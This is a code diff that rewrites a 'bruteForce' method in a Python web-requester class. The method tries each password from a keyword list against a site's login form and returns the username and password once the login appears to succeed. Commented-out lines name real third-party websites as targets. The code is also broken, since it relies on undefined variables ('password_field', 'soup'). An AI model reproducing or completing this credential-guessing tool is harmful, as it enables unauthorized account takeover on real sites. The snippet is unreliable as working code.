@@ -142,20 +142,20 @@ class Requester:
 #Returns Dictionary of correct credentials if successful bruteforce.
 #Unsuccessful Bruteforces return null
 def bruteForce(self, url, username, keywords):
-   postInfo = get(url)
-   #Attempt to login
-   query = {}
-   query[postInfo.username_field] = username
-   for password in keywords:
-       query[password_field] = password
-       response = post(postInfo, query)
-       forms = soup.findAll("form")
-       if soup.findAll(type ="password"):
-           #False if Login successful(supposedly)
-           continue
-       else:
-           return {"Username": username, "Password": password}
-   return None
+    r = Requester(url)
+    postInfo = r.get(url)
+    #Attempt to login
+    query = {}
+    query[postInfo.username_field] = username
+    for password in keywords:
+        query[password_field] = password
+        response = r.post(postInfo, query)
+        if soup.findAll(type ="password"):
+            #False if Login successful(supposedly)
+            continue
+        else:
+            return {"Username": username, "Password": password}
+    return None
 
 #path = 'http://austinchildrensacademy.org'
 #r =  Requester('http://shop.nhl.com')
